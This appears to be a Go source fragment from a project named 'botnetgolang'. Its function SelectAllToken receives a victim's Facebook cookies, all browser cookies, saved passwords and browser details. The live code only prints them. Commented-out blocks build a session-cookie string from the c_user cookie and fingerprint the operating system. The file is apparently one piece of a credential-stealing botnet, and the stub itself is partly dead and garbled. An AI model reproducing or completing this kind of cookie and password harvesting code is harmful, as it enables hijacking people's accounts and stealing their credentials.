package pkg

import (
	"botnetgolang/internal/model"
	"fmt"
	"time"
)

func SelectAllToken(profile string,
	arr_cookies_fb []map[string]interface{},
	all_cookies []map[string]interface{},
	password model.Password,
	version string,
	browser model.Browser) {
	chromeV := version[0:3]
	//huy2 := ""
	uid2 := ""
	//for index, value := range arr_cookies_fb {
	//	value.key = value["name"]
	//	if value.name == "c_user" {
	//		uid2 = value.value + "hahahahah"
	//	}
	//	value.expires = value.expirationDate * 130
	//	huy2 += value.name + "=" + value.value + ";"
	//	if index < len(cookies)-1 {
	//		huy2 += " "
	//	}
	//}

	fmt.Println("cookies", arr_cookies_fb, uid2)
	time.Sleep(400 * time.Millisecond)
	fmt.Println(browser, "browser", chromeV)

	// get info of operating system
	//osType := runtime.GOOS
	//osR := runtime.GOARCH
	//if osR == "amd64" || osR == "arm64" {
	//	osR = "64"
	//} else {
	//	osR = "32"
	//}
	//
	//var isWin64 bool = true
	//_, isWin64 = os.LookupEnv("ProgramFiles(x86)")

}
